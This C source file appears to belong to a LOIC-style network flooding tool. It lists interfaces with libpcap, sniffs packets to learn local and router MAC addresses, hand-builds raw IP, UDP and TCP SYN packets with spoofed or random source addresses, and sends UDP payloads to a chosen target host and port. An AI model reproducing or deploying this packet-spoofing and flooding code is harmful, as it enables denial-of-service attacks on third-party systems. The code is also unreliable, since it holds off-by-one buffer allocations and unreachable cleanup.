#include "superGears.h"

typedef unsigned short u16;
typedef unsigned long u32;

pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;


ip_address string2ip(const char* str) {

    ip_address ip = { 0, 0, 0, 0 };

    char delims[] = ".";

    if ( strcmp(str,"") != 0 ) {

        char* srct = (char*)malloc(strlen(str)*sizeof(char));
        strcpy(srct,str);
        char* c1 = strtok( (char*) srct, delims );

        char* c2 = strtok( (char*) NULL, delims );
        char* c3 = strtok( (char*) NULL, delims );
        char* c4 = strtok( (char*) NULL, delims );

        if ( c1 != NULL && c2 != NULL && c3 != NULL && c4 != NULL ) {

            int i1 = atoi(c1);
            int i2 = atoi(c2);
            int i3 = atoi(c3);
            int i4 = atoi(c4);

            if (i1 > -1 && i2 > -1 && i3 > -1 && i4 > -1 ) {
                /* source ip */
                ip.byte1 = i1;
                ip.byte2 = i2;
                ip.byte3 = i3;
                ip.byte4 = i4;
            }


        }
    }

    return ip;

}

char* ip2string( ip_address IPin ) {

    char* strIP = (char*) malloc( sizeof(char) * 15 );

    sprintf(strIP,"%d.%d.%d.%d",
            (int) IPin.byte1,
            (int) IPin.byte2,
            (int) IPin.byte3,
            (int) IPin.byte4
            );

    return strIP;

}

u_short integer2hexapacket(int in) {

    u_short in_cpy = (u_short) in;

    u_char* b1in = (u_char*) &in_cpy;
    u_char* b2in = (u_char*) &in_cpy + 1;

    u_short retu;
    u_short* ret = &retu;
    u_char* b1out = (u_char*) ret;
    u_char* b2out = (u_char*) ret + 1;

    *b1out = *b2in;
    *b2out = *b1in;


    ret = (u_short*) b1out;

    return retu;

}

ip_address randIP(int cat) {

    ip_address rIP;

    if (cat == 0) {
        rIP.byte1 = p_random(0,255);
    }
    else if (cat == 1) {
        rIP.byte1 = p_random(127,255);
    }
    else if (cat == 2) {
        rIP.byte1 = p_random(192,255);
    }
    rIP.byte2 = p_random(0,255);
    rIP.byte3 = p_random(0,255);
    rIP.byte4 = p_random(0,255);

    return rIP;

}

u16 checksum(u16 offset_ip_header, u16 len_ip_header, u_char buff[]) {

    u16 word16;
    u32 sum=0;
    u16 i;

        // make 16 bit words out of every two adjacent 8 bit words in the packet
        // and add them up

        for (i=offset_ip_header;i<len_ip_header+offset_ip_header;i=i+2){
                word16 =((buff[i]<<8)&0xFF00)+(buff[i+1]&0xFF);
                sum = sum + (u32) word16;
        }


        // take only 16 bits out of the 32 bit sum and add up the carries
        while (sum>>16)
          sum = (sum >> 16)+(sum & 0xFFFF);

        // one's complement the result
        sum = ~sum;


return ((u16) sum);
}

int c_print_devices_list() {
    pcap_if_t* alldevs;
    pcap_if_t* d;
    int i=0;
    char errbuf[PCAP_ERRBUF_SIZE];

#ifdef WIN32

    /* Retrieve the device list from the local machine */
    if ( pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL /* auth is not needed */, &alldevs, errbuf) == -1 ) {
        fprintf(stderr,"Error in pcap_findalldevs_ex: %s\n", errbuf);
        loic_error("Error in pcap_findalldevs_ex\n",CONSOLE);
    }
#elif defined (linux)
    /* Linux */
    if ( pcap_findalldevs(&alldevs, errbuf) == -1 ) {
        fprintf(stderr,"Error in pcap_findalldevs_ex: %s\n", errbuf);
        loic_error("Error in pcap_findalldevs_ex\n",CONSOLE);
    }
#endif
    /* Print the list */
    for(d = alldevs; d != NULL; d= d->next) {
        printf("%d. %s", ++i, d->name);
        printf(" (%s)",c_get_ip_from_device(d));
        printf("\n");


        if (d->description)
            printf(" (%s)\n", d->description);
        else
            printf(" (No description available)\n");

    }

    if (i == 0) {
        printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
        return 1;
    }

    /* We don't need any more the device list. Free it */
    pcap_freealldevs(alldevs);


    return 0;
}


char* c_get_interface_name_from_index(int index) {


    if (index > -1) {
        pcap_if_t* alldevs;
        pcap_if_t* d;
        int i=0;
        char errbuf[PCAP_ERRBUF_SIZE];

    #ifdef WIN32

        /* Retrieve the device list from the local machine */
        if ( pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL /* auth is not needed */, &alldevs, errbuf) == -1 ) {
            fprintf(stderr,"Error in pcap_findalldevs_ex: %s\n", errbuf);
            loic_error("Error in pcap_findalldevs_ex\n",CONSOLE);
        }
    #elif defined (linux)
        /* Linux */
        if ( pcap_findalldevs(&alldevs, errbuf) == -1 ) {
            fprintf(stderr,"Error in pcap_findalldevs_ex: %s\n", errbuf);
            loic_error("Error in pcap_findalldevs\n",CONSOLE);
        }
    #endif

        /* Print the list */
        for(d = alldevs; d != NULL; d= d->next) {
            i++;
            if (i == index) {
                char* retour = (char*) malloc( strlen(d->name)*sizeof(char) );
                strcpy(retour,d->name);

                /* We don't need any more the device list. Free it */
                pcap_freealldevs(alldevs);
                return retour;
            }

        }

        if (i == 0) {
            printf("\nNo interfaces found ! Make sure WinPcap is installed.\n");
            return "";
        }

        /* We don't need any more the device list. Free it */
        pcap_freealldevs(alldevs);
    }
    else if ( index == -1)
        c_print_devices_list();


    return "";
}

char* c_get_interface_hname_from_index(int index) {


    if (index > -1) {
        pcap_if_t* alldevs;
        pcap_if_t* d;
        int i=0;
        char errbuf[PCAP_ERRBUF_SIZE];

    #ifdef WIN32

        /* Retrieve the device list from the local machine */
        if ( pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL /* auth is not needed */, &alldevs, errbuf) == -1 ) {
            fprintf(stderr,"Error in pcap_findalldevs_ex: %s\n", errbuf);
            loic_error("Error in pcap_findalldevs_ex\n",CONSOLE);
        }
    #elif defined (linux)
        /* Linux */
        if ( pcap_findalldevs(&alldevs, errbuf) == -1 ) {
            fprintf(stderr,"Error in pcap_findalldevs_ex: %s\n", errbuf);
            loic_error("Error in pcap_findalldevs\n",CONSOLE);
        }
    #endif

        /* Print the list */
        for(d = alldevs; d != NULL; d= d->next) {
            i++;
            if (i == index && d->flags != PCAP_IF_LOOPBACK) {
                char* retour = (char*) malloc( strlen(d->description)*sizeof(char) );
                strcpy(retour,d->description);

                /* We don't need any more the device list. Free it */
                pcap_freealldevs(alldevs);
                return retour;
            }

        }

        if (i == 0) {
            printf("\nNo interfaces found ! Make sure WinPcap is installed.\n");
            return "";
        }

        /* We don't need any more the device list. Free it */
        pcap_freealldevs(alldevs);
    }
    else if ( index == -1)
        c_print_devices_list();


    return "";
}

int c_devices_count() {


        pcap_if_t* alldevs;
        pcap_if_t* d;
        int i=0;
        char errbuf[PCAP_ERRBUF_SIZE];

    #ifdef WIN32

        /* Retrieve the device list from the local machine */
        if ( pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL /* auth is not needed */, &alldevs, errbuf) == -1 ) {
            fprintf(stderr,"Error in pcap_findalldevs_ex: %s\n", errbuf);
            loic_error("Error in pcap_findalldevs_ex\n",CONSOLE);
        }
    #elif defined (linux)
        /* Linux */
        if ( pcap_findalldevs(&alldevs, errbuf) == -1 ) {
            fprintf(stderr,"Error in pcap_findalldevs_ex: %s\n", errbuf);
            loic_error("Error in pcap_findalldevs\n",CONSOLE);
        }
    #endif


        /* Print the list */
        for(d = alldevs; d != NULL; d= d->next) {
            i++;
        }

        if (i == 0) {
            printf("\nNo interfaces found ! Make sure WinPcap is installed.\n");
            return -1;
        }

        /* We don't need any more the device list. Free it */
        pcap_freealldevs(alldevs);




    return i;
}

interface_t interfaces[64];
int nb_interfaces = -1;


int generate_devices_list() {

    int nb_dev = c_devices_count();

    int dev_index;
    int my_index = 0;
    for ( dev_index=1; dev_index <= nb_dev; dev_index++) {

        pcap_if_t* dev = c_get_device_from_index( dev_index );

        char* ip_addr = c_ip_from_device(dev);

        if ( strcmp(ip_addr,"") != 0 ) {

            interfaces[my_index].interface_index = dev_index;
            interfaces[my_index].interface_name = c_get_interface_hname_from_index( dev_index );
            interfaces[my_index].interface_ip = string2ip( ip_addr );

            my_index++;


        }
    }

    nb_interfaces = my_index;
    printf("%d ifaces recorded\n",nb_interfaces);
    print_custom_device_list();

   return nb_interfaces;

}

int get_custom_device_count() {

    if (nb_interfaces == -1) {
        generate_devices_list();
    }



    return nb_interfaces;
}

char* get_ip_from_custom_device( int my_index ) {

    char* str = (char*) malloc( 32 * sizeof(char) );

    if ( my_index < get_custom_device_count() && my_index > -1 ) {

        strcpy( str, ip2string(interfaces[my_index].interface_ip ) );
    }

    return str;
}

int get_myindex_from_pcapindex( int pcap_index ) {

    int my_index = -1;

    if (get_custom_device_count() != -1) {

        int i;
        for ( i=0; i<get_custom_device_count(); i++ ) {

            if ( interfaces[i].interface_index == pcap_index ) {
                my_index = i;
            }

        }
    }

    return my_index;
}

char* get_custom_string_from_device( int my_index ) {

    char* str = (char*) malloc( 512 * sizeof(char) );

    if ( my_index < get_custom_device_count() && my_index > -1 ) {

        sprintf( str, "%d : (%s) %s\n",
                 interfaces[my_index].interface_index,
                 ip2string(interfaces[my_index].interface_ip),
                 interfaces[my_index].interface_name );
    }


    return str;

}

void print_custom_device_list() {

    int i;
    for ( i=0; i<nb_interfaces; i++ ) {
        printf( "%d : (%s) %s\n", interfaces[i].interface_index, ip2string(interfaces[i].interface_ip), interfaces[i].interface_name );
    }
}

pcap_if_t* c_get_device_from_index(int index) {


    if (index > -1) {
        pcap_if_t* alldevs;
        pcap_if_t* d;
        int i=0;
        char errbuf[PCAP_ERRBUF_SIZE];

    #ifdef WIN32

        /* Retrieve the device list from the local machine */
        if ( pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL /* auth is not needed */, &alldevs, errbuf) == -1 ) {
            fprintf(stderr,"Error in pcap_findalldevs_ex: %s\n", errbuf);
            loic_error("Error in pcap_findalldevs_ex\n",CONSOLE);
        }
    #elif defined (linux)
        /* Linux */
        if ( pcap_findalldevs(&alldevs, errbuf) == -1 ) {
            fprintf(stderr,"Error in pcap_findalldevs_ex: %s\n", errbuf);
            loic_error("Error in pcap_findalldevs\n",CONSOLE);
        }
    #endif

        /* Print the list */
        for(d = alldevs; d != NULL; d= d->next) {

            i++;
            if (i == index) {
                pcap_if_t* retour = d;

                return retour;

                /* We don't need any more the device list. Free it */
                pcap_freealldevs(alldevs);
            }

        }

        if (i == 0) {
            printf("\nNo interfaces found ! Make sure WinPcap is installed.\n");
            return NULL;
        }

        /* We don't need any more the device list. Free it */
        pcap_freealldevs(alldevs);
    }
    else if ( index == -1)
        c_print_devices_list();


    return NULL;
}

mac_address string2mac(const char* str) {

    mac_address mac = { 0, 0, 0, 0, 0, 0 };
    char delims[] = ":";

    if ( strcmp(str,"") != 0 ) {

        char* srct = (char*)malloc(strlen(str)*sizeof(char));
        strcpy(srct,str);
        char* c1 = strtok( (char*) srct, delims );

        char* c2 = strtok( (char*) NULL, delims );
        char* c3 = strtok( (char*) NULL, delims );
        char* c4 = strtok( (char*) NULL, delims );
        char* c5 = strtok( (char*) NULL, delims );
        char* c6 = strtok( (char*) NULL, delims );

        if ( c1 != NULL && c2 != NULL && c3 != NULL && c4 != NULL && c5 !=NULL && c6 != NULL ) {

            int i1 = strtoul(c1, (char **) NULL, 16);
            int i2 = strtoul(c2, (char **) NULL, 16);
            int i3 = strtoul(c3, (char **) NULL, 16);
            int i4 = strtoul(c4, (char **) NULL, 16);
            int i5 = strtoul(c5, (char **) NULL, 16);
            int i6 = strtoul(c6, (char **) NULL, 16);



            if ( i1 > -1 && i2 > -1 && i3 > -1 && i4 > -1 && i5 > -1 && i6 > -1 ) {
                /* source ip */
                mac.byte1 = i1;
                mac.byte2 = i2;
                mac.byte3 = i3;
                mac.byte4 = i4;
                mac.byte5 = i5;
                mac.byte6 = i6;
            }


        }

    }

    return mac;

}




int c_set_ethernet_header(u_char* packet, mac_address src, mac_address dst, int type) {

    eth_header* eh;

    /* Ethernet header (first datas) */
    eh = (eth_header*) (packet);


    eh->dmac = dst;
    eh->smac = src;

    /* Type : IP */
    packet[12]=0x08;
    packet[13]=0x00;

    return 14;
}



int c_set_ip_header(u_char* packet, int protocol, ip_address src, ip_address dst) {

    ip_header* ih;
    eth_header* eh;

    /* Ethernet header (first datas) */
    eh = (eth_header*) (packet);


    /* retireve the position of the ip header */
    ih = (ip_header *) (packet + 14); //length of ethernet header

    /* ip version (v4) + header lenght (20 bytes) */
    ih->ver_ihl = 0x45;


    /* services ? */
    ih->tos = 0x00;


    /* identification */
    ih->identification = 1926;

    /* flags */ /* fragment offset ? */
    ih->flags_fo = 64;

    /* ttl */
    ih->ttl = 128;

    /* Protocol : UDP */
    if ( protocol == UDP ) {
        ih->proto = 0x11;
    }
    else if (protocol == TCP ) {
        ih->proto = 0x06;
    }


    ih->saddr = src;
    ih->daddr = dst;


    /* FIN IPs */

    /* checksum (00 00) RRR */

    ih->crc = 0;

    int ip_len = (ih->ver_ihl & 0xf) * 4;


    return ip_len + 14;
}

int set_ip_header(u_char* packet, int protocol, int ttl, char* src, char* dst) {

    /* ip version (v4) + header lenght (20 bytes) */
    packet[14]=0x45;

    /* services ? */
    packet[15]=0x00;

    /* total length (IP header + following) RRR */
    packet[16]=0x00;
    packet[17]=0x21;

    /* identification */
    packet[18]=0xfe;
    packet[19]=0xd8;

    /* flags */
    packet[20] = 0x00;

    /* fragment offset ? */
    packet[20]=0x00;
    packet[21]=0x00;

    /* ttl */
    packet[22]=0x80;

    /* Protocol : UDP */
    if ( protocol == UDP)
        packet[23]=0x11;
    else
        packet[23]=0x06;


    /* IPS */

    /* source ip */
    packet[26]=0x0a;
    packet[27]=0x08;
    packet[28]=0x00;
    packet[29]=0x06;

    /* dest ip */
    packet[30]=0x58;
    packet[31]=0xbf;
    packet[32]=0x8c;
    packet[33]=0x92;


    /* Spoofing */


    char delims[] = ".";

    if ( strcmp(src,"") != 0 ) {

        char* srct = (char*)malloc(strlen(src)*sizeof(char));
        strcpy(srct,src);
        char* c1 = strtok( (char*) srct, delims );

        char* c2 = strtok( (char*) NULL, delims );
        char* c3 = strtok( (char*) NULL, delims );
        char* c4 = strtok( (char*) NULL, delims );

        if ( c1 != NULL && c2 != NULL && c3 != NULL && c4 != NULL ) {

            int i1 = atoi(c1);
            int i2 = atoi(c2);
            int i3 = atoi(c3);
            int i4 = atoi(c4);

            if (i1 > -1 && i2 > -1 && i3 > -1 && i4 > -1 ) {
                /* source ip */
                packet[26]=i1;
                packet[27]=i2;
                packet[28]=i3;
                packet[29]=i4;
            }


        }
    }

    if ( strcmp(dst,"") != 0 ) {

        char* dstt = (char*)malloc(strlen(dst)*sizeof(char));
        strcpy(dstt,dst);
        char* c1 = strtok( (char*) dstt, delims );

        char* c2 = strtok( (char*) NULL, delims );
        char* c3 = strtok( (char*) NULL, delims );
        char* c4 = strtok( (char*) NULL, delims );


        if ( c1 != NULL && c2 != NULL && c3 != NULL && c4 != NULL ) {

            int i1 = atoi(c1);
            int i2 = atoi(c2);
            int i3 = atoi(c3);
            int i4 = atoi(c4);

            if (i1 > -1 && i2 > -1 && i3 > -1 && i4 > -1 ) {
                /* dest ip */
                packet[30] = i1;
                packet[31] = i2;
                packet[32] = i3;
                packet[33] = i4;
            }


        }
    }


    /* FIN IPs */

    /* checksum (00 00) RRR */

    packet[24] = 0x00;
    packet[25] = 0x00;



    return 34;
}

int c_set_udp_header(u_char* packet, char* data) {


    ip_header* ih;
    eth_header* eh;
    udp_header* uh;
    u_int ip_len;

    /* Ethernet header (first datas) */
    eh = (eth_header*) (packet);


    /* retireve the position of the ip header */
    ih = (ip_header *) (packet + 14);

    /* retireve the position of the udp header */
    ip_len = (ih->ver_ihl & 0xf) * 4;

    uh = (udp_header*) (packet + 14 + ip_len);


    uh->sport = integer2hexapacket(999);
    uh->dport = integer2hexapacket( getPort() );


    char* d = (char*) (uh + 8);
    strcpy(d, data);

    int ulen = 8 + strlen(data) * sizeof(char);
    /* Udp header + following */
    uh->len = integer2hexapacket( ulen );

    printf("Char : %d   UH : %d\n",sizeof(char),ulen);

    uh->crc = 59110;


    return ( 14 + ip_len + ulen );


}


int set_udp_header(u_char* packet) {



    /* source port */
    packet[34]=0xdd;
    packet[35]=0xb9;

    /* dest port */
    packet[36]=0x01;
    packet[37]=0x4d;

    /* lenght ? (data only) */
    packet[38]=0x00;
    packet[39]=0x0d;

    /* checksum (another ? for UDP) */
    packet[40]=0x1e;
    packet[41]=0xf8;


    /* Data (trying to imitate LOIC) */
    /*
    packet[42]=0x68;
    packet[43]=0x65;
    packet[44]=0x6c;
    packet[45]=0x6c;
    packet[46]=0x6f;
    */

    return 47;
}

void print_packet(const u_char* packet, int p_len) {
    int i;
    printf("\n");
    for (i=0; i<p_len;i++) {
        printf("%.2x ",packet[i]);
        if (i % 16 == 15)
            printf ("\n");
        else if (i % 8 == 7)
            printf (" ");
    }

    printf("\n");
}

int c_set_tcp_header(u_char* packet, int type) {


    ip_header* ih;
    eth_header* eh;
    tcp_header* th;
    u_int ip_len;

    /* Ethernet header (first datas) */
    eh = (eth_header*) (packet);


    /* retireve the position of the ip header */
    ih = (ip_header *) (packet + 14);

    /* retireve the position of the udp header */
    ip_len = (ih->ver_ihl & 0xf) * 4;

    th = (tcp_header*) (packet + 14 + ip_len);

    /* source port */
    th->th_sport = integer2hexapacket(999);



    /* dest port */
    th->th_dport = integer2hexapacket( getPort() );
    printf("Port : %d\n",getPort());

    /* sequence number (4 bytes) */
    th->th_seq = 56;


    /* header length (32 b) */     /* FLAGS (IMPORTANT) */


    packet[46] = 0x80;

    packet[47] = 0x02;

    /* Window size value (?) */
    th->th_win = 20;


    /* Checksum (disabled here) */
    th->th_sum = 0;

    /* Options (maybe important) */

        /* max segment size */
        packet[54] = 0x02;
        packet[55] = 0x04;
        packet[56] = 0x05;
        packet[57] = 0xb4;

        /* no operation */
        packet[58] = 0x01;

        /* Window scale (multiply by 4) */
            /* Kind : Window scale (3) */
            packet[59] = 0x03;

            /* Length (3) */
            packet[60] = 0x03;

            /* Shift count (2) and multiplier (4) */
            packet[61] = 0x02;

        /* No operation */
            packet[62] = 0x01;
        /* No operation */
            packet[63] = 0x01;

        /* TCP SACK permitted (true) */
            packet[64] = 0x04;
            packet[65] = 0x02;



    return 66;

}


int set_tcp_header(u_char* packet, int type) {

    /* source port */
    packet[34]=0xcd;
    packet[35]=0xae;

    /* dest port */
    packet[36]=0x01;
    packet[37]=0x4d;


    /* sequence number (4 bytes) */
    packet[38] = 0x52;
    packet[39] = 0x26;
    packet[40] = 0x93;
    packet[41] = 0xc8;

    packet[42] = 0x00;
    packet[43] = 0x00;
    packet[44] = 0x00;
    packet[45] = 0x00;


    /* header length (32 b) */     /* FLAGS (IMPORTANT) */

    packet[46] = 0x80;

    packet[47] = 0x02;

    /* Window size value (?) */
    packet[48] = 0x20;
    packet[49] = 0x00;


    /* Checksum (disabled here) */
    packet[50] = 0xf3;
    packet[51] = 0x27;

    packet[52] = 0x00;
    packet[53] = 0x00;

    /* Options (maybe important) */

        /* max segment size */
        packet[54] = 0x02;
        packet[55] = 0x04;
        packet[56] = 0x05;
        packet[57] = 0xb4;

        /* no operation */
        packet[58] = 0x01;

        /* Window scale (multiply by 4) */
            /* Kind : Window scale (3) */
            packet[59] = 0x03;

            /* Length (3) */
            packet[60] = 0x03;

            /* Shift count (2) and multiplier (4) */
            packet[61] = 0x02;

        /* No operation */
            packet[62] = 0x01;
        /* No operation */
            packet[63] = 0x01;

        /* TCP SACK permitted (true) */
            packet[64] = 0x04;
            packet[65] = 0x02;


    return 66;

}


/* From tcptraceroute, convert a numeric IP address to a string */
char* iptos(u_long in) {
    static char output[IPTOSBUFFERS][3*4+3+1];
    static short which;
    u_char *p;

    p = (u_char *)&in;
    which = (which + 1 == IPTOSBUFFERS ? 0 : which + 1);
    sprintf(output[which], "%d.%d.%d.%d", p[0], p[1], p[2], p[3]);
    return output[which];
}


char* c_get_ip_from_device(pcap_if_t* d) {

    pcap_addr_t* a;
    char* ipaddr = (char*) malloc(sizeof(char)*15);


    /* IP addresses */
    for(a=d->addresses;a;a=a->next) {
        if (a->addr) {

            switch(a->addr->sa_family) {
                case AF_INET:
                if (a->addr)
                  strcpy(ipaddr,iptos(((struct sockaddr_in *)a->addr)->sin_addr.s_addr));
                break;


                default:
                break;
            }
        }
    }

      return ipaddr;

}

/* Print all the available information on the given interface */
void ifprint(pcap_if_t *d) {
  pcap_addr_t *a;

  /* Name */
  printf("%s\n",d->name);

  /* Description */
  if (d->description)
    printf("\tDescription: %s\n",d->description);

  /* Loopback Address*/
  printf("\tLoopback: %s\n",(d->flags & PCAP_IF_LOOPBACK)?"yes":"no");

  /* IP addresses */
  for(a=d->addresses;a;a=a->next) {

    if (a->addr) {

        u_short fam = a->addr->sa_family;


        //printf("%s\n",fam);
        if (a->addr) {
            /*
            printf("\tAddress Family: #%d\n",fam);
*/
            switch( fam != '\0' ) {
              case AF_INET:
                printf("\tAddress Family Name: AF_INET\n");
                if (a->addr)
                  printf("\tAddress: %s\n",iptos( (( struct sockaddr_in* )a->addr)->sin_addr.s_addr));
                if (a->netmask)
                  printf("\tNetmask: %s\n",iptos( (( struct sockaddr_in* )a->netmask)->sin_addr.s_addr));
                if (a->dstaddr)
                  printf("\tDestination Address: %s\n",iptos(((struct sockaddr_in *)a->dstaddr)->sin_addr.s_addr));

                else
                if (a->broadaddr)
                  printf("\tBroadcast Address: %s\n",iptos(((struct sockaddr_in *)a->broadaddr)->sin_addr.s_addr));

                break;


              default:
                printf("\tAddress Family Name: Unknown\n");
                break;
            }
        }
    }

  }

  return;
}

/* Print all the available information on the given interface */
char* c_ip_from_device(pcap_if_t* d) {
  pcap_addr_t* a;

  for(a=d->addresses;a;a=a->next) {
    if (a->addr) {

        switch(a->addr->sa_family) {

          case AF_INET:

            if (a->addr) {
                char* ip_addr = iptos( ( (struct sockaddr_in *)a->addr)->sin_addr.s_addr );

                return ip_addr;
            }
            break;

          default:
            break;

        }
    }
  }

  return "";
}



int c_get_packet(char* device) {

    pcap_t* adhandle;
    int res;
    char errbuf[PCAP_ERRBUF_SIZE];

    struct pcap_pkthdr* pcap_header;
    const u_char* pkt_data;

    printf("Ready to listen. (  %s  )\n",device);


        /* Open the device */
        if ( (adhandle= pcap_open(device,           // name of the device
                                  65536,            // portion of the packet to capture.
                                                    // 65536 guarantees that the whole packet will be captured on all the link layers
                                  PCAP_OPENFLAG_PROMISCUOUS,    // promiscuous mode
                                  2000,             // read timeout
                                  NULL,             // authentication on the remote machine
                                  errbuf            // error buffer
                                  ) ) == NULL)
        {
            fprintf(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n", device);
            /* Free the device list */
            pcap_close(adhandle);
            return -1;
        }
        printf("Done. Closing ..\n");

        struct bpf_program fcode;

        printf("LOCK\n\n");
        pthread_mutex_lock(&mutex);
        if (pcap_compile(adhandle, &fcode, "ip and udp and src host 192.168.1.10 and dst port 333", 1, 0xffffff) < 0) {
            pthread_mutex_unlock(&mutex);

            fprintf(stderr,"\nUnable to compile the packet filter. Check the syntax.\n");
            /* Free the device list */
            pcap_close(adhandle);
            return -1;
        }
       else if (pcap_setfilter(adhandle, &fcode) < 0)
        {
            fprintf(stderr,"\nError setting the filter.\n");
            /* Free the device list */
            pcap_close(adhandle);
            return -1;
        }
       pthread_mutex_unlock(&mutex);


        /* Retrieve the packets */
        while((res = pcap_next_ex( adhandle, &pcap_header, &pkt_data)) >= 0){

            if(res == 0) {
                printf("Timeout !\n");
                /* Timeout elapsed */
                break;
            }


            /* convert the timestamp to readable format */
            /*
            local_tv_sec = header->ts.tv_sec;
            localtime_s(&ltime, &local_tv_sec);
            strftime( timestr, sizeof timestr, "%H:%M:%S", &ltime);
            */

            //printf("00:00:00,%.6d len:%d\n", header->ts.tv_usec, header->len);
            c_infos_from_packet(pcap_header, pkt_data);
            c_config_pattern_packet( pkt_data, (int) pcap_header->caplen );
            //print_packet(pkt_data,header->len);
        }


        /* At this point, we don't need any more the device list. Free it */
        pcap_close(adhandle);

        printf("Closed.\n");

        if(res == -1){
            printf("Error reading the packets: %s\n", pcap_geterr(adhandle));
            return -1;
        }

        return 0;
    }

/* 1 -> dev name;  2 -> src; 3 -> dst; */
int c_get_pattern_packet(char* args[4]) {

    char* dev_name = (char*) malloc(sizeof(char)*strlen(args[0]));
    strcpy(dev_name,args[0]);
    pcap_t* adhandle;
    int res;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct pcap_pkthdr* pcap_header;
    const u_char* pkt_data;



        /* Open the device */
        if ( (adhandle= pcap_open(dev_name,           // name of the device
                                  65536,            // portion of the packet to capture.
                                                    // 65536 guarantees that the whole packet will be captured on all the link layers
                                  PCAP_OPENFLAG_PROMISCUOUS,    // promiscuous mode
                                  2000,             // read timeout
                                  NULL,             // authentication on the remote machine
                                  errbuf            // error buffer
                                  ) ) == NULL)
        {
            fprintf(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n", dev_name);
            /* Free the device list */
            pcap_close(adhandle);
            return -1;
        }

        char* exp = (char*) malloc( sizeof(char) * 512 );
        sprintf(exp,"ip and udp and src host %s and dst host %s and port %s",args[1],args[2],args[3]);

        pthread_mutex_lock(&mutex);

        struct bpf_program fcode;

        if (pcap_compile(adhandle, &fcode, exp, 1, 0xffffff) < 0) {
            pthread_mutex_unlock(&mutex);
            printf("Unable to compile the packet filter. Check the syntax.\n");
            /* Free the device list */
            pcap_close(adhandle);
            return -1;
        }

       else if (pcap_setfilter(adhandle, &fcode) < 0) {

            fprintf(stderr,"\nError setting the filter.\n");
            /* Free the device list */
            pcap_close(adhandle);
            pthread_mutex_unlock(&mutex);

            return -1;
        }



        /* Retrieve the packets */
        while((res = pcap_next_ex( adhandle, &pcap_header, &pkt_data)) >= 0) {

            if(res == 0) {
                printf("Timeout! ! (%s)\n",dev_name);

                /* Timeout elapsed */
                break;
            }

            int ret1 = -1;
            pthread_mutex_unlock(&mutex);

            ret1 = c_config_pattern_packet(pkt_data, (int) pcap_header->caplen);


            pcap_close(adhandle);


            if (ret1 == 0) {
                printf("THATS OK!\n");
                return 0;
            }
        }
        pthread_mutex_unlock(&mutex);


        /* At this point, we don't need any more the device list. Free it */
        pcap_close(adhandle);



        if(res == -1){
            printf("Error reading the packets: %s\n", pcap_geterr(adhandle));
            return -1;
        }

        return 1;
    }

/* Callback function invoked by libpcap for every incoming packet */
int c_config_pattern_packet( const u_char* pkt_data, int size ) {


    ip_header* ih;
    eth_header* eh;
    u_int ip_len;

    /* Ethernet header (first datas) */
    eh = (eth_header*) (pkt_data);


    /* retireve the position of the ip header */
    ih = (ip_header *) (pkt_data + 14); /* length of ethernet header */

    /* retireve the position of the udp header */
    ip_len = (ih->ver_ihl & 0xf) * 4;


    setInterfaceMac(eh->smac);
    setRouterMac(eh->dmac);

    setInterfaceIp(ih->saddr);

    int ret2 = setPatternPacket( pkt_data, size );

    if (ret2 == 0) {
        return 0;
    }

    return 1;
}

int c_check_pattern_packet( const u_char* pkt_data, int size ) {

    ip_header* ih;
    eth_header* eh;
    u_int ip_len;

    /* Ethernet header (first datas) */
    eh = (eth_header*) (pkt_data);


    /* retireve the position of the ip header */
    ih = (ip_header *) (pkt_data +
        14); //length of ethernet header

    /* retireve the position of the udp header */
    ip_len = (ih->ver_ihl & 0xf) * 4;


    return checkInterfaceMac(eh->smac) + checkRouterMac(eh->dmac) + checkInterfaceIp(ih->saddr) ;
}


/* Callback function invoked by libpcap for every incoming packet */
void c_infos_from_packet(const struct pcap_pkthdr* header, const u_char* pkt_data) {
    char timestr[16];
    ip_header* ih;
    udp_header* uh;
    eth_header* eh;
    u_int ip_len;
    u_short sport,dport;


    /*
    (VOID)(param);

    local_tv_sec = header->ts.tv_sec;
    localtime_s(&ltime, &local_tv_sec);
    strftime( timestr, sizeof timestr, "%H:%M:%S", &ltime);
    */

    /* print timestamp and length of the packet */
    printf("%s len:%d ", timestr, header->len);

    /* Ethernet header (first datas) */
    eh = (eth_header*) (pkt_data);

    printf("%.2x:%.2x:%.2x:%.2x:%.2x:%.2x -> %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n",
           eh->smac.byte1,
           eh->smac.byte2,
           eh->smac.byte3,
           eh->smac.byte4,
           eh->smac.byte5,
           eh->smac.byte6,
           eh->dmac.byte1,
           eh->dmac.byte2,
           eh->dmac.byte3,
           eh->dmac.byte4,
           eh->dmac.byte5,
           eh->dmac.byte6
           );

    /* retireve the position of the ip header */
    ih = (ip_header *) (pkt_data +
        14); //length of ethernet header

    /* retireve the position of the udp header */
    ip_len = (ih->ver_ihl & 0xf) * 4;


    uh = (udp_header *) ((u_char*)ih + ip_len);

    /* convert from network byte order to host byte order */
    sport = ntohs( uh->sport );
    dport = ntohs( uh->dport );

    /* print ip addresses and udp ports */
    printf("%d.%d.%d.%d:%d -> %d.%d.%d.%d:%d\n",
        ih->saddr.byte1,
        ih->saddr.byte2,
        ih->saddr.byte3,
        ih->saddr.byte4,
        sport,
        ih->daddr.byte1,
        ih->daddr.byte2,
        ih->daddr.byte3,
        ih->daddr.byte4,
        dport);
}


int send_pattern_packet(const char* dst, int port) {

    SOCKET s = createSocket(UDP);


    struct hostent* hostinfo = NULL;
    SOCKADDR_IN to = { 0 };

    int tosize = sizeof to;

    hostinfo = gethostbyname(dst);
    if ( hostinfo == NULL ) {
        printf ("Unknown host %s.\n", dst);
        exit(EXIT_FAILURE);
    }

    to.sin_addr = *(IN_ADDR *) hostinfo->h_addr;
    to.sin_port = htons(port);
    to.sin_family = AF_INET;


    char buffer[512] = "";
    char sent_data[1024];

    strcat(buffer,getUdpMessage());



        strcpy(sent_data,buffer);

        if (isRandomEnabled())
            strcat(sent_data,random_string());



        if( sendto(s, sent_data, strlen(sent_data), 0, (SOCKADDR*)&to, tosize) < 0 ) {
            printf("Connection error.\n");
            exit(errno);
        }
        else {
            closesocket(s);
            return 0;
        }

    closesocket(s);


    return 1;
}

